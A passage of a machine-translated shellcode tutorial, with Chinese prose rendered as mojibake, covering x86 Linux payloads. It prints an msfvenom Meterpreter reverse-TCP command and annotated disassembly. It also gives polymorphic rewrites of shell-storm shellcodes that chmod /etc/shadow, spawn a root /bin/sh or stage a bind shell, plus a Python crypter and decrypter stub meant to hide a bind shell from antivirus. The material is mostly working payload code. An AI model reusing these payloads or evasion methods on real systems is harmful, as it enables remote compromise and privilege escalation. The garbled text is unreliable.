<pre><code class="plaintext hljs">$sctest -vv -S -s 10000 -G shell.dot &lt; exec_whoami.bin</code></pre><br>
<pre><code class="plaintext hljs">[emu 0x0x16c8100 debug ] 6A0B                            push byte 0xb<font></font>
; execve()		<font></font>
[emu 0x0x16c8100 debug ] 58                              pop eax		<font></font>
[emu 0x0x16c8100 debug ] 99                              cwd<font></font>
; in this case - set to 0 due to cwd and small eax<font></font>
[emu 0x0x16c8100 debug ] 52                              push edx		<font></font>
; "-c"<font></font>
[emu 0x0x16c8100 debug ] 66682D63                        push word 0x632d	<font></font>
; address of "-c"<font></font>
[emu 0x0x16c8100 debug ] 89E7                            mov edi,esp		<font></font>
; /bin/sh<font></font>
[emu 0x0x16c8100 debug ] 682F736800                      push dword 0x68732f	<font></font>
[emu 0x0x16c8100 debug ] 682F62696E                      push dword 0x6e69622f<font></font>
; 1st arg of execve()<font></font>
[emu 0x0x16c8100 debug ] 89E3                            mov ebx,esp		<font></font>
; null<font></font>
[emu 0x0x16c8100 debug ] 52                              push edx		<font></font>
; place "whoami" in stack<font></font>
[emu 0x0x16c8100 debug ] E8                              call 0x1		<font></font>
; push "-c"<font></font>
[emu 0x0x16c8100 debug ] 57                              push edi		<font></font>
; push "/bin/sh"<font></font>
[emu 0x0x16c8100 debug ] 53                              push ebx		<font></font>
; 2nd argument of execve() <font></font>
; pointer to args<font></font>
[emu 0x0x16c8100 debug ] 89E1                            mov ecx,esp		<font></font>
; execute execve()<font></font>
[emu 0x0x16c8100 debug ] CD80                            int 0x80		</code></pre><br>
<img src="https://habrastorage.org/webt/vv/s2/mx/vvs2mxrhami1dfpzknj_1s41wvo.png" alt="å›¾ç‰‡"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
è°ƒç”¨æŒ‡ä»¤è¿˜ç”¨äºæ‰§è¡Œå‘½ä»¤ï¼Œè¿™ä½¿æ›´æ”¹å¯æ‰§è¡Œå‘½ä»¤å˜å¾—å®¹æ˜“ã€‚</font></font><br>
<br>
<b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">3.åå‘Meterpreter TCP</font></font></b><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> 
å‘½ä»¤ä»¥ç”Ÿæˆæœ‰æ•ˆè´Ÿè½½</font></font><br>
<br>
<pre><code class="plaintext hljs">msfvenom -a x86 --platform linux -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.0.102 LPORT=4444 -f raw &gt; meter_revtcp.bin</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
ç„¶å</font></font><br>
<br>
<pre><code class="plaintext hljs">ndisasm -u meter_revtcp.bin</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
å¸¦æ³¨é‡Šçš„ä»£ç </font></font><br>
<pre><code class="plaintext hljs">00000000  6A0A              push byte +0xa<font></font>
00000002  5E                pop esi			; place 10 in esi<font></font>
00000003  31DB              xor ebx,ebx			; nullify ebx<font></font>
00000005  F7E3              mul ebx<font></font>
00000007  53                push ebx			; push 0<font></font>
00000008  43                inc ebx			; 1 in ebx<font></font>
00000009  53                push ebx			; push 1<font></font>
0000000A  6A02              push byte +0x2		; push 2<font></font>
0000000C  B066              mov al,0x66			; mov socketcall<font></font>
0000000E  89E1              mov ecx,esp			; address of argument<font></font>
00000010  CD80              int 0x80			; calling socketcall() with socket()<font></font>
00000012  97                xchg eax,edi		; place sockfd in edi<font></font>
00000013  5B                pop ebx			; in ebx 1<font></font>
00000014  68C0A80066        push dword 0x6600a8c0	; place IPv4 address connect to<font></font>
00000019  680200115C        push dword 0x5c110002	; place port and proto family<font></font>
0000001E  89E1              mov ecx,esp<font></font>
00000020  6A66              push byte +0x66<font></font>
00000022  58                pop eax			; socketcall()<font></font>
00000023  50                push eax<font></font>
00000024  51                push ecx			; addresss of sockaddr_in structure<font></font>
00000025  57                push edi			; sockfd<font></font>
00000026  89E1              mov ecx,esp			; address of arguments<font></font>
00000028  43                inc ebx<font></font>
00000029  CD80              int 0x80			; call connect()<font></font>
0000002B  85C0              test eax,eax		; <font></font>
0000002D  7919              jns 0x48			; if connect successful - jmp<font></font>
0000002F  4E                dec esi			; in esi 10 - number of attempts to connect<font></font>
00000030  743D              jz 0x6f			; if zero attempts left - exit<font></font>
00000032  68A2000000        push dword 0xa2<font></font>
00000037  58                pop eax<font></font>
00000038  6A00              push byte +0x0<font></font>
0000003A  6A05              push byte +0x5<font></font>
0000003C  89E3              mov ebx,esp<font></font>
0000003E  31C9              xor ecx,ecx<font></font>
00000040  CD80              int 0x80			; wait 5 seconds<font></font>
00000042  85C0              test eax,eax<font></font>
00000044  79BD              jns 0x3<font></font>
00000046  EB27              jmp short 0x6f<font></font>
00000048  B207              mov dl,0x7			; mov dl 7 - read, write, execute for mprotect() memory area<font></font>
0000004A  B900100000        mov ecx,0x1000		; 4096 bytes<font></font>
0000004F  89E3              mov ebx,esp<font></font>
00000051  C1EB0C            shr ebx,byte 0xc<font></font>
00000054  C1E30C            shl ebx,byte 0xc		; nullify 12 lowest bits<font></font>
00000057  B07D              mov al,0x7d			; mprotect syscall<font></font>
00000059  CD80              int 0x80<font></font>
0000005B  85C0              test eax,eax<font></font>
0000005D  7810              js 0x6f			; if no success with mprotect -&gt; exit<font></font>
0000005F  5B                pop ebx			; if success put sockfd in ebx<font></font>
00000060  89E1              mov ecx,esp<font></font>
00000062  99                cdq<font></font>
00000063  B60C              mov dh,0xc<font></font>
00000065  B003              mov al,0x3			; read data from socket<font></font>
00000067  CD80              int 0x80<font></font>
00000069  85C0              test eax,eax<font></font>
0000006B  7802              js 0x6f<font></font>
0000006D  FFE1              jmp ecx			; jmp to 2nd part of shell<font></font>
0000006F  B801000000        mov eax,0x1<font></font>
00000074  BB01000000        mov ebx,0x1<font></font>
00000079  CD80              int 0x80<font></font>
</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
æ­¤ä»£ç åˆ›å»ºä¸€ä¸ªå¥—æ¥å­—ï¼Œå°è¯•è¿æ¥åˆ°æŒ‡å®šç«¯å£ä¸Šçš„æŒ‡å®šIPåœ°å€ï¼Œåˆ›å»ºä¸€ä¸ªå†…å­˜åŒºåŸŸï¼Œå¹¶å°è¯•ä»è¯¥å¥—æ¥å­—è¯»å–Shellcodeçš„ç¬¬äºŒéƒ¨åˆ†å¹¶å†™å…¥åˆ†é…çš„å†…å­˜åŒºåŸŸã€‚</font><font style="vertical-align: inherit;">å¦‚æœè¿æ¥å¤±è´¥ï¼Œç¨‹åºå°†ç­‰å¾…5ç§’é’Ÿå¹¶é‡è¯•ã€‚</font><font style="vertical-align: inherit;">å‡ æ¬¡å°è¯•å¤±è´¥æˆ–å‘ç”Ÿå…¶ä»–å¼‚å¸¸åï¼Œå®ƒå°†åœæ­¢å·¥ä½œã€‚</font></font><br>
<br>
<h4><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">6.ä»shell-stormæ‰§è¡Œ3ç§shellcodeçš„å¤šæ€è½¬æ¢ã€‚</font></font></h4><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
å¤šæ€è½¬æ¢æ˜¯å…¶ä¸­shellcodeä»£ç æ›´æ”¹å¹¶ä¸”é€»è¾‘è¢«ä¿ç•™çš„è½¬æ¢ã€‚</font><font style="vertical-align: inherit;">ä¾‹å¦‚ï¼š</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
xor eaxï¼Œeaxä¼šé‡ç½®å¯„å­˜å™¨ï¼Œ</font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
sub eaxï¼Œeaxä¹Ÿä¼šé‡ç½®å¯„å­˜å™¨ã€‚</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
è¿™ä¸¤ä¸ªé€‰é¡¹ä¹‹é—´çš„åŒºåˆ«åœ¨äºæ€§èƒ½ï¼šç¬¬ä¸€ä¸ªé€‰é¡¹çš„è¿è¡Œé€Ÿåº¦æ›´å¿«ã€‚</font><font style="vertical-align: inherit;">å¤šæ€è½¬æ¢ä¼šæ›´æ”¹shellcodeç­¾åï¼Œè¿™æœ‰åŠ©äºä»åç—…æ¯’ä¸­éšè—shellcodeã€‚</font></font><br>
<br>
<b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1. chmod / etc / shadow</font></font></b><br>
<br>
<pre><code class="plaintext hljs">	; http://shell-storm.org/shellcode/files/shellcode-608.php<font></font>
	; Title: linux/x86 setuid(0) + chmod("/etc/shadow", 0666) Shellcode 37 Bytes<font></font>
	; length - 40 bytes<font></font>
	section .text<font></font>
<font></font>
global _start<font></font>
<font></font>
_start:<font></font>
	sub ebx, ebx	; replaced<font></font>
	push 0x17	; replaced<font></font>
	pop eax		; replaced<font></font>
	int 0x80<font></font>
	sub eax, eax	; replaced<font></font>
	push eax	; on success zero<font></font>
	push 0x776f6461<font></font>
        push 0x68732f63<font></font>
        push 0x74652f2f<font></font>
	mov ebx, esp<font></font>
	mov cl, 0xb6	; replaced<font></font>
	mov ch, 0x1	; replaced<font></font>
        add al, 15	; replaced<font></font>
        int 0x80<font></font>
        add eax, 1	; replaced<font></font>
        int 0x80</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
æ­¤shellcodeè°ƒç”¨å‚æ•°ä¸º0,0çš„setuidï¼ˆï¼‰ï¼ˆå°è¯•è·å–rootæƒé™ï¼‰ï¼Œç„¶åä¸º/ etc / shadowæ–‡ä»¶æ‰§è¡Œchmodï¼ˆï¼‰ã€‚</font></font><br>
<br>
<img src="https://habrastorage.org/webt/0p/db/mo/0pdbmogrsi4bdn849ylf8hbjbti.png" alt="å›¾ç‰‡"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
åœ¨æŸäº›æƒ…å†µä¸‹ï¼Œå¯ä»¥åœ¨ä¸é‡ç½®å¯„å­˜å™¨çš„æƒ…å†µä¸‹æ‰§è¡Œæ­¤shellcodeã€‚</font></font><br>
<br>
<pre><code class="plaintext hljs"><font></font>
	section .text<font></font>
global _start<font></font>
<font></font>
_start:<font></font>
	push 0x17	; replaced<font></font>
	pop eax		; replaced<font></font>
	int 0x80<font></font>
	push eax	; on success zero<font></font>
	push 0x776f6461<font></font>
        push 0x68732f63<font></font>
        push 0x74652f2f<font></font>
	mov ebx, esp<font></font>
	mov cl, 0xb6	; replaced<font></font>
	mov ch, 0x1	; replaced<font></font>
        add al, 15	; replaced<font></font>
        int 0x80<font></font>
        add eax, 1	; replaced<font></font>
        int 0x80</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
é€šè¿‡asmï¼ˆè€Œä¸æ˜¯Cæ–‡ä»¶ï¼‰â€œæ”¶é›†â€æ­¤ä»£ç åï¼Œå°±å¯ä»¥æˆåŠŸæ‰§è¡Œå®ƒã€‚</font></font><br>
<br>
<b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2.æ‰§è¡Œ/ bin / sh</font></font></b><br>
<br>
<pre><code class="plaintext hljs">	; http://shell-storm.org/shellcode/files/shellcode-251.php<font></font>
	; (Linux/x86) setuid(0) + setgid(0) + execve("/bin/sh", ["/bin/sh", NULL]) 37 bytes<font></font>
	; length - 45 byte<font></font>
	section .text<font></font>
global _start<font></font>
_start:<font></font>
	push 0x17<font></font>
	mov eax, [esp]	; replaced<font></font>
	sub ebx, ebx	; replaced<font></font>
	imul edi, ebx	; replaced<font></font>
	int 0x80<font></font>
<font></font>
	push 0x2e<font></font>
	mov eax, [esp]	; replaced<font></font>
	push edi 	; replaced<font></font>
	int 0x80<font></font>
<font></font>
	sub edx, edx	; replaced<font></font>
	push 0xb<font></font>
	pop eax<font></font>
	push edi	; replaced<font></font>
	push 0x68732f2f<font></font>
	push 0x6e69622f<font></font>
	lea ebx, [esp]	; replaced<font></font>
	push edi	; replaced<font></font>
	push edi	; replaced<font></font>
	lea esp, [ecx]	; replaced<font></font>
	int 0x80</code></pre><br>
<img src="https://habrastorage.org/webt/9q/cl/-o/9qcl-ol-qznvbz8jckiaheke8i8.png" alt="å›¾ç‰‡"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
åœ¨ä¸Šé¢çš„ç¤ºä¾‹ä¸­ï¼Œå·²ç»å¤šæ¬¡è€ƒè™‘äº†æ­¤Shellcodeã€‚</font><font style="vertical-align: inherit;">ä»–ä¸éœ€è¦ç‰¹æ®Šçš„è§£é‡Šã€‚</font></font><br>
<br>
<b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">3.ä½¿ç”¨ç¬¬äºŒé˜¶æ®µçš„TCPç»‘å®šshellcode</font></font></b><br>
<br>
<pre><code class="plaintext hljs">	; original: http://shell-storm.org/shellcode/files/shellcode-501.php<font></font>
	; linux/x86 listens for shellcode on tcp/5555 and jumps to it 83 bytes<font></font>
	; length 94<font></font>
	section .text<font></font>
global _start<font></font>
<font></font>
_start:<font></font>
	sub eax, eax	; replaced<font></font>
	imul ebx, eax	; replaced<font></font>
	imul edx, eax	; replaced<font></font>
<font></font>
_socket:<font></font>
	push 0x6<font></font>
	push 0x1<font></font>
	push 0x2<font></font>
	add al, 0x66	; replaced<font></font>
	add bl, 1	; replaced<font></font>
	lea ecx, [esp] ; replaced<font></font>
	int 0x80<font></font>
<font></font>
_bind:<font></font>
	mov edi, eax	; placing descriptor<font></font>
	push edx<font></font>
	push WORD 0xb315	;/* 5555 */<font></font>
	push WORD 2<font></font>
	lea ecx, [esp]	; replaced<font></font>
	push 16<font></font>
	push ecx<font></font>
	push edi<font></font>
	xor eax, eax	; replaced<font></font>
	add al, 0x66	; replaced<font></font>
	add bl, 1	; replaced<font></font>
	lea ecx, [esp]	; replaced<font></font>
	int 0x80<font></font>
<font></font>
_listen:<font></font>
	mov bl, 4	; replaced<font></font>
	push 0x1<font></font>
	push edi<font></font>
	add al, 0x66	; replaced<font></font>
	lea ecx, [esp]	; replaced<font></font>
	int 0x80<font></font>
<font></font>
_accept:<font></font>
	push edx<font></font>
	push edx<font></font>
	push edi<font></font>
	add al, 0x66	; replaced<font></font>
	mov bl, 5	; replaced<font></font>
	lea ecx, [esp]	; replaced<font></font>
	int 0x80<font></font>
	mov ebx, eax<font></font>
<font></font>
_read:<font></font>
	mov al, 0x3<font></font>
	lea ecx, [esp]	; replaced<font></font>
	mov dx, 0x7ff<font></font>
	mov dl, 1	; replaced<font></font>
	int 0x80<font></font>
	jmp esp</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
æ­¤shellcodeæ‰“å¼€è¿æ¥ï¼Œæ¥æ”¶shellcodeçš„ç¬¬äºŒéƒ¨åˆ†å¹¶æ‰§è¡Œå®ƒã€‚</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
ç¬¬äºŒéƒ¨åˆ†ä»£ç ï¼š</font></font><br>
<br>
<pre><code class="plaintext hljs">	section .text<font></font>
global _start<font></font>
<font></font>
_start:<font></font>
	xor eax, eax<font></font>
	mov al, 1<font></font>
	xor ebx, ebx<font></font>
	mov ebx, 100<font></font>
	int 0x80</code></pre><br>
<img src="https://habrastorage.org/webt/no/zo/n2/nozon26a2dzjtvnngfwkrrz10cc.png" alt="å›¾ç‰‡"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
å¦‚æ‚¨æ‰€è§ï¼Œshellcodeçš„ç¬¬äºŒéƒ¨åˆ†æ˜¯æˆåŠŸçš„ã€‚</font><font style="vertical-align: inherit;">ç¨‹åºé€€å‡ºä»£ç ä¸º100ã€‚</font></font><br>
<br>
<h4><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">7.å¯†ç å­¦å®¶</font></font></h4><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
å°½ç®¡åœ¨æ­¤è¿‡ç¨‹ä¸­ï¼Œå°½ç®¡ä½¿ç”¨é«˜çº§Cè¯­è¨€å’Œè¾…åŠ©åº“å¯¹shellcodeè¿›è¡Œäº†åŠ å¯†ï¼Œä½†æˆ‘è¿˜æ˜¯å†³å®šåœ¨æ±‡ç¼–å™¨ä¸­å®Œæˆæ­¤ä»»åŠ¡ï¼Œå› ä¸º </font><font style="vertical-align: inherit;">å°½ç®¡ç®€åŒ–äº†åŠ å¯†ç®—æ³•ï¼Œä½†è¯¥è¯¾ç¨‹ä¸“é—¨é’ˆå¯¹æ±‡ç¼–ç¨‹åºã€‚</font></font><br>
<br>
<b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">crypter.py</font></font></b><br>
<br>
<pre><code class="python hljs"><span class="hljs-comment">#!/usr/bin/python</span>
<span class="hljs-comment"># -*- coding: utf-8 -*-</span><font></font>
<font></font>
<span class="hljs-keyword">import</span> sys
<span class="hljs-keyword">import</span> random<font></font>
<font></font>
<span class="hljs-keyword">if</span> len(sys.argv) != <span class="hljs-number">2</span>:<font></font>
	print(<span class="hljs-string">"Enter shellcode in hex"</span>)<font></font>
	sys.exit(<span class="hljs-number">0</span>)<font></font>
<font></font>
shellcode = sys.argv[<span class="hljs-number">1</span>]<font></font>
plain_shellcode = bytearray.fromhex(shellcode)<font></font>
<font></font>
<span class="hljs-comment"># Generating key</span><font></font>
key_length = len(plain_shellcode)<font></font>
r = <span class="hljs-string">''</span>.join(chr(random.randint(<span class="hljs-number">0</span>,<span class="hljs-number">255</span>)) <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> range(key_length))<font></font>
key = bytearray(r.encode())<font></font>
<font></font>
encrypted_shellcode = <span class="hljs-string">""</span>
plain_key = <span class="hljs-string">""</span><font></font>
<font></font>
<span class="hljs-keyword">for</span> b <span class="hljs-keyword">in</span> range(len(plain_shellcode)):<font></font>
	enc_b = (plain_shellcode[b] + key[b]) &amp; <span class="hljs-number">255</span>
	encrypted_shellcode += <span class="hljs-string">'%02x'</span> % enc_b<font></font>
	plain_key += <span class="hljs-string">'0x'</span>+ <span class="hljs-string">'%02x'</span> % key[b] + <span class="hljs-string">','</span><font></font>
<font></font>
print(<span class="hljs-string">'*'</span>*<span class="hljs-number">150</span>)<font></font>
print(encrypted_shellcode)<font></font>
print(<span class="hljs-string">'*'</span>*<span class="hljs-number">150</span>)<font></font>
print(plain_key)<font></font>
print(<span class="hljs-string">'*'</span>*<span class="hljs-number">150</span>)<font></font>
print(key_length)</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
é¦–å…ˆï¼Œåˆ›å»ºä¸€ä¸ªâ€œéª¨æ¶â€ï¼š</font></font><br>
<br>
<pre><code class="plaintext hljs">	section .text<font></font>
global _start<font></font>
<font></font>
_start:<font></font>
	; push encrypted shellcode<font></font>
	&lt;PUSH ENCRYPTED SHELLCODE&gt;<font></font>
<font></font>
	jmp getdata<font></font>
next:	pop ebx<font></font>
<font></font>
	mov esi, esp<font></font>
	mov edi, esp<font></font>
	; place key length<font></font>
	mov ecx, &lt;KEY LENGTH&gt;<font></font>
<font></font>
decrypt:<font></font>
	lodsb<font></font>
	sub al, byte [ebx]<font></font>
	inc ebx<font></font>
	stosb<font></font>
	loop decrypt<font></font>
<font></font>
	jmp esp<font></font>
	; exit<font></font>
	xor eax, eax<font></font>
	mov al, 1<font></font>
	xor ebx, ebx<font></font>
	int 0x80<font></font>
<font></font>
<font></font>
getdata: call next<font></font>
	; Place key on next line<font></font>
	key db &lt;CIPHER KEY&gt;</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
å¯¹äºæ­¤ä»£ç ï¼Œä¸‰ä»¶äº‹æ˜¯å¿…è¦çš„ï¼šå…·æœ‰å·²ç¼–ç çš„Shellcodeï¼Œå¯†é’¥é•¿åº¦å’ŒåŠ å¯†å¯†é’¥æœ¬èº«çš„æŒ‡ä»¤ã€‚</font><font style="vertical-align: inherit;">æˆ‘ä»¬å¯¹TCPç»‘å®šå¤–å£³ç¨‹åºshellcodeè¿›è¡ŒåŠ å¯†ã€‚</font><font style="vertical-align: inherit;">æ‰“å°æ“ä½œç ï¼š</font></font><br>
<br>
<pre><code class="plaintext hljs">$hexopcode bind_tcp_shell <font></font>
31c031db31f6566a016a02b066b30189e1cd8089c25666680929666a0289e16a105152b066b30289e1cd806a0152b066b30489e1cd80565652b066b30589e1cd8089c231c9b10389d349b03fcd8079f931c050682f2f7368682f62696e89e35089e25389e1b00bcd80</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
æˆ‘ä»¬å°†å¯¹å…¶åŠ å¯†ï¼š</font></font><br>
<br>
<pre><code class="plaintext hljs">$./crypter.py 31c031db31f6566a016a02b066b30189e1cd8089c25666680929666a0289e16a105152b066b30289e1cd806a0152b066b30489e1cd80565652b066b30589e1cd8089c231c9b10389d349b03fcd8079f931c050682f2f7368682f62696e89e35089e25389e1b00bcd80<font></font>
*******************************Encrypted shellcode*******************************<font></font>
4af2f48df478632d902db527287245fb5d8f38accc18f7b4ccae29ffc514fc2dc614d5e12946c535068f392d921449b111c738a35042da18dd730a75c04b8719c5b93cab8b31554c7fb773fa8f0cb976f37ba483f2bf361ee5f1132c20ba09bf4b86ad4c6f72b78f13<font></font>
***********************************KEY*******************************************<font></font>
0x19,0x32,0xc3,0xb2,0xc3,0x82,0x0d,0xc3,0x8f,0xc3,0xb3,0x77,0xc2,0xbf,0x44,0x72,0x7c,0xc2,0xb8,0x23,0x0a,0xc2,0x91,0x4c,0xc3,0x85,0xc3,0x95,0xc3,0x8b,0x1b,0xc3,0xb6,0xc3,0x83,0x31,0xc3,0x93,0xc3,0xac,0x25,0xc2,0xb9,0xc3,0x91,0xc2,0x99,0x4b,0x5e,0xc3,0xaf,0xc2,0x83,0xc2,0x84,0xc2,0x8b,0xc3,0xa4,0xc2,0xbb,0xc2,0xa6,0x4c,0x45,0x30,0x7a,0x7a,0xc2,0x80,0x52,0xc3,0xac,0x6e,0xc3,0xbb,0xc2,0x8c,0x40,0x7d,0xc2,0xbb,0x54,0x1b,0xc3,0x90,0xc3,0xb6,0x7d,0xc2,0xb1,0xc3,0xb2,0x31,0x26,0x6f,0xc2,0xa4,0x5a,0xc3,0x8e,0xc2,0xac,0xc2,0x93,<font></font>
***********************************KEY LENGTH************************************<font></font>
105</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
æ‰“å°æ¨é€è¯´æ˜ä»¥è·å–æˆ‘ä»¬çš„ç»“æœï¼š</font></font><br>
<br>
<pre><code class="plaintext hljs">$python3 hex2stack.py 4af2f48df478632d902db527287245fb5d8f38accc18f7b4ccae29ffc514fc2dc614d5e12946c535068f392d921449b111c738a35042da18dd730a75c04b8719c5b93cab8b31554c7fb773fa8f0cb976f37ba483f2bf361ee5f1132c20ba09bf4b86ad4c6f72b78f13<font></font>
	push 0x90909013<font></font>
	push 0x8fb7726f<font></font>
        ...</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
åœ¨asmæ–‡ä»¶ä¸­å¡«å†™æ‰€æœ‰å¿…è¦çš„å‚æ•°ã€‚</font></font><br>
<br>
<pre><code class="plaintext hljs">	section .text<font></font>
global _start<font></font>
<font></font>
_start:<font></font>
	; push encrypted shellcode<font></font>
	push 0x90909013<font></font>
	push 0x8fb7726f<font></font>
	push 0x4cad864b<font></font>
	push 0xbf09ba20<font></font>
	push 0x2c13f1e5<font></font>
	push 0x1e36bff2<font></font>
	push 0x83a47bf3<font></font>
	push 0x76b90c8f<font></font>
	push 0xfa73b77f<font></font>
	push 0x4c55318b<font></font>
	push 0xab3cb9c5<font></font>
	push 0x19874bc0<font></font>
	push 0x750a73dd<font></font>
	push 0x18da4250<font></font>
	push 0xa338c711<font></font>
	push 0xb1491492<font></font>
	push 0x2d398f06<font></font>
	push 0x35c54629<font></font>
	push 0xe1d514c6<font></font>
	push 0x2dfc14c5<font></font>
	push 0xff29aecc<font></font>
	push 0xb4f718cc<font></font>
	push 0xac388f5d<font></font>
	push 0xfb457228<font></font>
	push 0x27b52d90<font></font>
	push 0x2d6378f4<font></font>
	push 0x8df4f24a<font></font>
<font></font>
	jmp getdata<font></font>
next:	pop ebx<font></font>
<font></font>
	mov esi, esp<font></font>
	mov edi, esp<font></font>
	; place key length<font></font>
	mov ecx, 105<font></font>
<font></font>
decrypt:<font></font>
	lodsb<font></font>
	sub al, byte [ebx]<font></font>
	inc ebx<font></font>
	stosb<font></font>
	loop decrypt<font></font>
<font></font>
	jmp esp<font></font>
	; exit<font></font>
	xor eax, eax<font></font>
	mov al, 1<font></font>
	xor ebx, ebx<font></font>
	int 0x80<font></font>
<font></font>
<font></font>
getdata: call next<font></font>
	; Place key on next line<font></font>
	key db 0x19,0x32,0xc3,0xb2,0xc3,0x82,0x0d,0xc3,0x8f,0xc3,0xb3,0x77,0xc2,0xbf,0x44,0x72,0x7c,0xc2,0xb8,0x23,0x0a,0xc2,0x91,0x4c,0xc3,0x85,0xc3,0x95,0xc3,0x8b,0x1b,0xc3,0xb6,0xc3,0x83,0x31,0xc3,0x93,0xc3,0xac,0x25,0xc2,0xb9,0xc3,0x91,0xc2,0x99,0x4b,0x5e,0xc3,0xaf,0xc2,0x83,0xc2,0x84,0xc2,0x8b,0xc3,0xa4,0xc2,0xbb,0xc2,0xa6,0x4c,0x45,0x30,0x7a,0x7a,0xc2,0x80,0x52,0xc3,0xac,0x6e,0xc3,0xbb,0xc2,0x8c,0x40,0x7d,0xc2,0xbb,0x54,0x1b,0xc3,0x90,0xc3,0xb6,0x7d,0xc2,0xb1,0xc3,0xb2,0x31,0x26,0x6f,0xc2,0xa4,0x5a,0xc3,0x8e,0xc2,0xac,0xc2,0x93,</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
æˆ‘ä»¬ç¼–è¯‘ï¼š</font></font><br>
<br>
<pre><code class="plaintext hljs">$nasm32 encrypted_bind</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
ä»æ–‡ä»¶è·å–æ“ä½œç ï¼š</font></font><br>
<br>
<pre><code class="plaintext hljs">$popcode encrypted_bind</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
å°†æ‰€æœ‰è¿™äº›å†…å®¹æ”¾å…¥shellcode.cä¸­ï¼Œè¿›è¡Œç¼–è¯‘å¹¶è¿è¡Œã€‚</font></font><br>
<br>
<img src="https://habrastorage.org/webt/84/t5/5t/84t55tdqgrnbbq9lbdh6_798j6a.png" alt="å›¾ç‰‡"><br>
<br>
<h3><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">å‚è€ƒæ–‡çŒ®</font></font></h3><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
æ‰€æœ‰æ–‡ä»¶å’Œç¤ºä¾‹çš„é“¾æ¥éƒ½å¯ä»¥åœ¨</font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">è¿™é‡Œ</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">æ‰¾åˆ°</font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u="><font style="vertical-align: inherit;">ã€‚</font></a></font><br>
<br>
<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">æ¥æºã€‚</font></font></a></div>
      
    </div>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../zh-CN488404/index.html">2020å¹´å€¼å¾—æœŸå¾…çš„æ¸¸æˆ</a></li>
<li><a href="../zh-CN488406/index.html">IPv6-æ‚¨åšé”™äº†</a></li>
<li><a href="../zh-CN488408/index.html">STM32ä»¥å¤ªç½‘-RS485 IoTç½‘å…³</a></li>
<li><a href="../zh-CN488410/index.html">æˆ‘åœ¨åå¹´çš„å‘å±•ä¸­å­¦åˆ°çš„7è¯¾</a></li>
<li><a href="../zh-CN488412/index.html">åŸºäºdiscord.jsåˆ›å»ºDiscordæœºå™¨äºº</a></li>
<li><a href="../zh-CN488418/index.html">ä½¿ç”¨Spring Securityå’ŒMongoDBè¿›è¡ŒREST APIèº«ä»½éªŒè¯</a></li>
<li><a href="../zh-CN488422/index.html">10è¡Œä»£ç å¯å‡è½»æ‚¨çš„Vueé¡¹ç›®çš„ç—›è‹¦</a></li>
<li><a href="../zh-CN488424/index.html">2020å¹´ITSMå°†ä¼šå‘ç”Ÿä»€ä¹ˆï¼Ÿ</a></li>
<li><a href="../zh-CN488426/index.html">å¦‚ä½•è¿›è¡Œä»£ç å®¡æŸ¥ï¼Ÿç¬¬2éƒ¨åˆ†ï¼šæŸ¥çœ‹å¯¼èˆªï¼Œé€Ÿåº¦ï¼Œè¯„è®ºï¼Œå†²çª</a></li>
<li><a href="../zh-CN488428/index.html">æˆ‘ä»¬å¦‚ä½•é¢„æµ‹Yandexæœç´¢çš„æœªæ¥ï¼šä»é”™è¯¯ä¿®å¤åˆ°å‘ç°æŸ¥è¯¢</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter63335242 = new Ya.Metrika({
                  id:63335242,
                  clickmap:true,
                  trackLinks:true,
